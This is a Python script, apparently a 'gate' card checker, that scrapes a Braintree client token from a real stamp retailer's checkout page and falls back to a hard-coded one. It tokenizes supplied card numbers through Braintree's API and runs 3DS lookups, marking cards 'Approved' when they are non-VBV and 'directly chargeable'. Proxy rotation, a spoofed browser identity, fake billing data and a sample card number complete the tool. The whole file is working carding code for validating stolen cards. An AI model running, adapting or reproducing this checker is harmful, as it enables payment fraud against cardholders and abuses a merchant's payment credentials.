"""
Inu Gate Engine - Standalone Braintree CCN Auth ($0.00)
"""
import sys, os
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import aiohttp
import time
import json
import base64
import random
import uuid
import re

# Fallback persistent token (auto-refreshed dynamically)
_FALLBACK_FINGERPRINT = (
    "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0."
    "eyJleHAiOjE3ODc4NDA2NjksImp0aSI6Ijc5ZDJlYWY2LTE1Y2QtNGIxNC04NWExLWVkZjQ5OTI3ZDNhOSIsInN1YiI6IjVoZ3pxZ3BjbmRuM2ZzNHkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjVoZ3pxZ3BjbmRuM2ZzNHkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImluZm9tYWtpc3RhbXBzZGUiLCJwYXlwYWxfY2xpZW50X2lkIjoiQWZJM3ZaUTBFZmVVTGZxRElEQlZGNGY4eDh5aUVHV3Z3a0hnYm1CYi1Vclo5Y19sMGhOb2FaNTB4eXpEUDA0ZEdEU0RLYmJUcEc3Q0xwLVoifX0."
    "nOQOSLk7iVujeq2TDRaFDVKrrzaqZIaD_pG984zT_KsaIkz6C7wZxqbKHwu0DUje6g0_-FU6bq41WYNRVwcl4g"
)

_cached_fingerprint = _FALLBACK_FINGERPRINT
_cache_expiry = time.time() + 43200

def _format_proxy(p):
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

def _extract_fp_from_text(text: str) -> str | None:
    if not text:
        return None
    match = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', text)
    if match:
        try:
            decoded = base64.b64decode(match.group(1)).decode()
            data = json.loads(decoded)
            fp = data.get("authorizationFingerprint")
            if fp:
                return fp
        except Exception:
            pass
    # Direct match for raw base64 or JSON
    match2 = re.search(r'\"authorizationFingerprint\"\s*:\s*\"([^\"]+)\"', text)
    if match2:
        return match2.group(1)
    return None

async def _get_auth_fingerprint(session, proxy_url=None):
    global _cached_fingerprint, _cache_expiry
    now = time.time()
    if _cached_fingerprint and now < _cache_expiry:
        return _cached_fingerprint
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }
    
    # Try direct first (fastest and bypasses dead user proxies)
    try:
        async with session.get('https://www.makistamps.com/checkout/', headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as r:
            if r.status == 200:
                resp_text = await r.text()
                fp = _extract_fp_from_text(resp_text)
                if fp:
                    _cached_fingerprint = fp
                    _cache_expiry = now + 43200
                    return fp
    except Exception:
        pass

    # Try with proxy if direct failed
    if proxy_url:
        try:
            async with session.get('https://www.makistamps.com/checkout/', headers=headers, proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    resp_text = await r.text()
                    fp = _extract_fp_from_text(resp_text)
                    if fp:
                        _cached_fingerprint = fp
                        _cache_expiry = now + 43200
                        return fp
        except Exception:
            pass

    # Safe persistent fallback
    if _FALLBACK_FINGERPRINT:
        _cached_fingerprint = _FALLBACK_FINGERPRINT
        _cache_expiry = now + 43200
        return _FALLBACK_FINGERPRINT

    return None

async def check_card_inu(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[bool, str, str, str]:
    """
    Native execution of Inu Gate: Braintree CCN Auth ($0.00).
    Returns (is_live, status_str, response_str, raw_json)
    """
    proxy_url = _format_proxy(proxy_url)
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)
    bin_number = cc[:6]

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # 1. Scrape Braintree Client Fingerprint
            fp = await _get_auth_fingerprint(session, proxy_url)
            if not fp:
                return False, "Declined! ❌", "Failed to retrieve Braintree Token", "{}"

            # 2. Tokenize Card via Braintree GraphQL
            gql_headers = {
                'authorization': f'Bearer {fp}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            }
            gql_payload = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'dropin2',
                    'sessionId': str(uuid.uuid4()),
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc,
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            try:
                async with session.post('https://payments.braintree-api.com/graphql', headers=gql_headers, json=gql_payload, proxy=proxy_url) as r:
                    gql_resp = await r.json()
            except Exception:
                async with session.post('https://payments.braintree-api.com/graphql', headers=gql_headers, json=gql_payload) as r:
                    gql_resp = await r.json()

            tokencc = (gql_resp.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
            if not tokencc:
                err = ""
                if isinstance(gql_resp, dict) and 'errors' in gql_resp:
                    err = gql_resp['errors'][0].get('message', 'GraphQL Error')
                return False, "Declined! ❌", f"Tokenize Failed: {err}" if err else "Card Tokenize Failed", json.dumps(gql_resp)

            # 3. Perform 3DS/CCN Auth Lookup
            lookup_headers = {
                'content-type': 'application/json',
                'origin': 'https://www.makistamps.com',
                'referer': 'https://www.makistamps.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            }
            lookup_payload = {
                'amount': '0.00',
                'browserColorDepth': 24,
                'browserJavaEnabled': False,
                'browserJavascriptEnabled': True,
                'browserLanguage': 'en-US',
                'browserScreenHeight': 900,
                'browserScreenWidth': 1440,
                'browserTimeZone': -300,
                'deviceChannel': 'Browser',
                'additionalInfo': {
                    'billingLine1': '5 Lady Rd',
                    'billingCity': 'Edinburgh',
                    'billingPostalCode': 'EH16 5PA',
                    'billingCountryCode': 'GB',
                    'email': 'testinguser99@gmail.com',
                },
                'bin': bin_number,
                'dfReferenceId': '0_dae63dbd-1418-47e8-8188-de3dca30ead3',
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.133.0',
                    'issuerDeviceDataCollectionResult': True,
                },
                'authorizationFingerprint': fp,
                'braintreeLibraryVersion': 'braintree/web/3.133.0',
                '_meta': {
                    'merchantAppId': 'www.makistamps.com',
                    'platform': 'web',
                    'sdkVersion': '3.133.0',
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': str(uuid.uuid4()),
                },
            }

            lookup_url = f'https://api.braintreegateway.com/merchants/5hgzqgpcndn3fs4y/client_api/v1/payment_methods/{tokencc}/three_d_secure/lookup'
            try:
                async with session.post(lookup_url, headers=lookup_headers, json=lookup_payload, proxy=proxy_url) as r:
                    res_json = await r.json()
            except Exception:
                async with session.post(lookup_url, headers=lookup_headers, json=lookup_payload) as r:
                    res_json = await r.json()

            # 4. Determine Auth status
            try:
                statuscc = res_json["paymentMethod"]["threeDSecureInfo"]["status"]
                if statuscc in ['authenticate_successful', 'authenticate_attempt_successful', 'authenticate_successful_issuer_not_participating']:
                    return True, "Approved! ✅", "3DS Passed (Frictionless / Non-VBV)", json.dumps(res_json)
                elif statuscc in ['lookup_not_enrolled', 'lookup_bypassed']:
                    return True, "Approved! ✅", "Non-VBV (Direct Chargeable)", json.dumps(res_json)
                elif statuscc in ['challenge_required', 'authenticate_rejected']:
                    return False, "Declined! ❌", "3DS Challenge Required (OTP Enforced)", json.dumps(res_json)
                elif statuscc in ['lookup_card_error', 'authenticate_failed']:
                    return False, "Declined! ❌", "Card Declined by Issuer", json.dumps(res_json)
                else:
                    return False, "Declined! ❌", f"Declined ({statuscc.replace('_', ' ').title()})", json.dumps(res_json)
            except KeyError:
                err_msg = res_json.get('error', {}).get('message', '3DS Lookup Failed')
                return False, "Declined! ❌", err_msg, json.dumps(res_json)

    except Exception as e:
        return False, "Error! ⚠️", str(e), "{}"

if __name__ == '__main__':
    test_card = sys.argv[1] if len(sys.argv) > 1 else "4833160315600632|09|2030|000"
    p = test_card.split('|')
    print(f"[*] Running Native Test of Inu Gate on: {test_card}")
    start = time.time()
    is_live, status, response, raw = asyncio.run(check_card_inu(p[0], p[1], p[2], p[3]))
    elapsed = round(time.time() - start, 2)
    print(f"Status: {status} | Response: {response} | Time: {elapsed}s")
